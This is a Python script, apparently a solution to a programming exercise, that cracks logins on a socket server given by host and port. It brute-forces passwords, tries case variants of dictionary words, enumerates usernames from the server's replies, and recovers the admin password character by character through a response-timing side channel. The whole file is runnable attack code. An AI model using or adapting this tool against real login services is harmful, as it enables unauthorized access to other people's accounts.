import sys
from socket import socket
import itertools
import string
import os
import json
from datetime import datetime


class PasswordHacker:
    success_message = "Connection success!"
    wrong_password_message = "Wrong password!"
    login_exception_message = "Exception happened during login"
    passwords_file = "passwords.txt"
    logins_file = "logins.txt"

    def __init__(self, host, port):
        self.host = host
        self.port = port


    @staticmethod
    def generate_password_brute_force(character_set):
        """
        Generates all permutations of all of the combinations of all lengths of the
        given character set
        """
        for i in range(1, len(character_set) + 1):
            for password in itertools.product(character_set, repeat=i):
                password = "".join(list(password))
                yield password

    def find_password_brute_force(self):
        character_set = string.ascii_lowercase + string.digits
        return self.find_password(self.generate_password_brute_force(character_set))

    @staticmethod
    def generate_variants(file_path):
        """
        Generates all variants of the words in the given file
        Example: if word is ab then variants are "ab", "Ab", "aB", "AB"
        There are (2 ^ length of the word) variants for each word
        """
        with open(file_path) as file:
            for line in file:
                lists = []
                word = line.strip("\n")
                for char in word:
                    if char.isdigit():
                        lower_upper = [char]
                    else:
                        lower_upper = [char.lower(), char.upper()]
                    lists.append(lower_upper)

                for variant in itertools.product(*lists):
                    variant = "".join(variant)
                    yield variant

    def generate_password_dictionary(self):
        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), self.passwords_file)
        return self.generate_variants(file_path)

    def find_password_dictionary(self):
        return self.find_password(self.generate_password_dictionary())

    def generate_logins(self):
        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), self.logins_file)
        return self.generate_variants(file_path)

    def find_password(self, password_list):
        with socket() as client_socket:
            address = self.host, self.port
            client_socket.connect(address)
            for password in password_list:
                client_socket.send(password.encode())
                response = client_socket.recv(1024).decode()
                if response == self.success_message:
                    return password

    def find_login(self, client_socket):
        admin_info = dict()
        for login in self.generate_logins():
            admin_info["login"] = login
            admin_info["password"] = " "
            login_rec = json.dumps(admin_info)
            client_socket.send(login_rec.encode())
            response = json.loads(client_socket.recv(1024).decode())
            if response["result"] == self.wrong_password_message:
                return login

    def find_admin_info(self, client_socket, admin_login):
        character_set = string.ascii_letters + string.digits
        current_chars = ""
        admin_info = dict()
        while True:
            for char in character_set:
                admin_info["login"] = admin_login
                admin_info["password"] = current_chars + char
                login_rec = json.dumps(admin_info)
                client_socket.send(login_rec.encode())
                start = datetime.now()
                response = json.loads(client_socket.recv(1024).decode())
                finish = datetime.now()

                # if response["result"] == self.login_exception_message:
                if (finish - start).total_seconds() > 0.1:
                    current_chars = current_chars + char
                    break
                elif response["result"] == self.success_message:
                    return login_rec

    def find_password_exception(self):
        with socket() as client_socket:
            address = self.host, self.port
            client_socket.connect(address)
            admin_login = self.find_login(client_socket)
            admin_info = self.find_admin_info(client_socket, admin_login)
            return admin_info


if __name__ == "__main__":
    password_hacker = PasswordHacker(sys.argv[1], int(sys.argv[2]))
    print(password_hacker.find_password_exception())
